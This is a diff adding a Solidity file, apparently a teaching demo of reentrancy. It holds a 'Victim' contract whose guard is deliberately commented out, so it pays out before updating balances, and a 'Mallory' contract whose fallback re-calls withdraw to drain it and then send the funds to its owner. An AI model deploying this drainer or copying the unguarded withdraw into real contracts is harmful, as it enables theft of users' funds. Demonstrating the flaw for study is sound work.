@@ -1,0 +1,65 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >= 0.8;
+
+contract ReentrancyGuarded {
+
+    bool reentrancyLock = false;
+
+    /* Prevent a contract function from being reentrant-called. */
+    modifier reentrancyGuard {
+        if (reentrancyLock) {
+            revert();
+        }
+        reentrancyLock = true;
+        _;
+        reentrancyLock = false;
+    }
+}
+
+contract Victim{ //is ReentrancyGuarded{
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public{ //reentrancyGuard{
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+}
+
+contract Mallory {
+    Victim public depositFunds;
+    address owner;
+
+    constructor(address _depositFundsAddress) {
+        depositFunds = Victim(_depositFundsAddress);
+        owner = msg.sender;
+    }
+
+    // Fallback is called when DepositFunds sends Ether to this contract.
+    fallback() external payable {
+        if (address(depositFunds).balance >= 1 ether) {
+            depositFunds.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        depositFunds.deposit{value: 1 ether}();
+        depositFunds.withdraw();
+    }
+
+    function getJackpot() external {
+        require(msg.sender == owner);
+        payable(owner).send(address(this).balance);
+    }
+
+}
+
